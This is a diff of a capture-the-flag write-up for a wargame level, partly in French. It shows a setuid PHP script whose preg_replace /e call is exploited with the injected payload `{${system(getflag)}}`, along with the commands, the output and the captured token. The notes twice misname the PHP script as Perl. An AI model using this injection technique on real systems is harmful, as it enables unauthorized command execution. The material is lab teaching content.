@@ -1,31 +1,55 @@
 # LEVEL 06
 
-## 💡 Explanation
-
-In this level we have to:
-1. We check the permissions of the files: `-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06`
-2. Then, we check the content of `level06`, we can see that it executes the file `level06.php`
-3. The file `level06.php`is calling the function `preg_replace`passing `e` as modifier => Deprecated since it executes the matching string!
-4. We have to build a string that executes `getflag` and matches the regex => Something like `[x getflag]`
-5. Last step, we need to get the output of the command, not the command itself... => `{${system(getflag)}}` Voilà!
-
-## 👾 Commands
-
+- Same as usual
 ```
-strings level06 => /usr/bin/php /home/user/level06/level06.php
-echo '[x pwd]' > /tmp/lol; ./level06 /tmp/lol lol
-echo '[x {$blub}]' > /tmp/lol; ./level06 /tmp/lol lol
-echo '[x {${system(ls)}}]' > /tmp/lol; ./level06 /tmp/lol lol
-echo '[x {${system(getflag)}}]' > /tmp/lol; ./level06 /tmp/lol lol
+ls -l
+total 12
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+cat level06.php
 ```
 
-## 🔍 Resources
 
-- [PHP preg_replace command - Errors/Exceptions](https://www.php.net/manual/en/function.preg-replace.php#refsect1-function.preg-replace-errors)
-- [How to exploit preg_replace /e (1)](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)
-- [How to exploit preg_replace /e (2)](https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df)
-- [How to exploit preg_replace /e (3)](https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/)
-- [How to get the return value of a function](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex)
+```php
+#!/usr/bin/php
+<?php
+function y($m) {
+  $m = preg_replace("/\./", " x ", $m);
+  $m = preg_replace("/@/", " y", $m);
+  return $m;
+}
+function x($y, $z) {
+  $a = file_get_contents($y);
+  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+  $a = preg_replace("/\[/", "(", $a);
+  $a = preg_replace("/\]/", ")", $a);
+  return $a;
+}
+$r = x($argv[1], $argv[2]);
+print $r;
+?>
 
-## 🔥 Password
-`wiok45aaoguiboiki2tuin6ub`
+```
+
+- `preg_replace` est la seule fonction appellee, en googlant 'preg_replace exploit' on trouve [ca](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4)
+- Le script perl:
+	1. lit un fichier dont le nom est passe en deuxieme argument
+	2. passe le contenu de ce fichier a travers une regex de substitution
+	3. execute le code
+- On veut excecuter getflag dans un terminal, ce qui donne en perl `system(getflag)`
+- On doit donc ecrire dans un fichier une string qui apres transformation par la regex donne `system(getflag)`
+- Une session de bidouille intense sur ce [site](https://www.functions-online.com/preg_replace.html) de regex nous permet de trouver la solution: `{${system(getflag)}}`
+
+```bash
+echo "[x {\${system(getflag)}}]" > /var/crash/level06
+./level06 /var/crash/level06 xxx
+```
+```
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+
+
+`echo '[x {${system(getflag)}}]' > /tmp/lol; ./level06 /tmp/lol lol`
+- On peut se log avec `wiok45aaoguiboiki2tuin6ub`
